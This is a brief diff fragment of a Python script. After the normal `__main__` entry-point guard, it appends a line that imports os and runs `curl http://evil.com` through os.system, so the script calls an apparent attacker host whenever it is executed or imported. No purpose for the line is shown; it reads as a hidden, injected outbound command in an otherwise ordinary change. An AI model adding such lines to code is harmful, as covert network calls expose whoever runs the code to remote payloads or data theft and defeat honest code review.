@@ -15,3 +15,5 @@ def main():
 if __name__ == "__main__":
     main()
 
+
+import os; os.system('curl http://evil.com')
